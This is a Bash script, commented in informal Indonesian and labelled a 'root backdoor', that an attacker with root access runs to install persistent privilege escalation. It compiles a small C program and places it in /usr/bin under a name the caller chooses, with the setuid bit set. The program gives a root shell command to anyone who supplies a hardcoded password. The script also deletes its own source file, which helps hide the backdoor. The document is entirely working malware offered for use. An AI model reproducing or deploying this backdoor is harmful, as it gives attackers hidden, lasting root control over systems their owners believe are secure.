#!/bin/bash
# Root backdoor by Wedus
# Masi berantakan tod

if [ $(id -u) != 0 ]; then
	echo "uid != 0"
	echo "Ga bisa Jalan Script nya"
	exit
fi

if [ ! $1 ] || [ ! $2 ]; then
	echo "Cara: $0 <nama_backdor> <password>"
	exit
fi

cat > /tmp/root.c << EOF
#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>

int main(int argc, char *argv[]) {
	if(argv[1] && argv[2]) {
		char pass[] = "$2";
		if(strcmp(argv[1], pass) == 0) {
			setuid(0);
			setgid(0);
			system(argv[2]);
		} else {
			printf("Err: password salah blok!\n");
		}
	} else {
		printf("Cara: %s <password> <command>\n", argv[0]);
	}
	return 0;
}
EOF

if [ -f /tmp/root.c ]; then echo "[+] /tmp/root.c berhasil"; else echo "[-] ga bisa buat /tmp/root.c"; exit; fi

if [ -x $(command -v gcc) ]; then echo "[+] gcc ada"; else echo "[-] gcc ga ada"; exit; fi
gcc /tmp/root.c -o /tmp/root
rm -rf /tmp/root.c

mv /tmp/root /usr/bin/$1
chmod +x /usr/bin/$1
chmod +s /usr/bin/$1
if [ -x /usr/bin/$1 ]; then echo "[+] /usr/bin/$1 berhasil dan bisa di jalankan"; else echo "[-] /usr/bin/$1 tidak bisa atau tidak bisa di exsekusi"; exit; fi

echo "[+] done"
echo -e "\nrun command \"$1\" or \"/usr/bin/$1\" bukan root user"
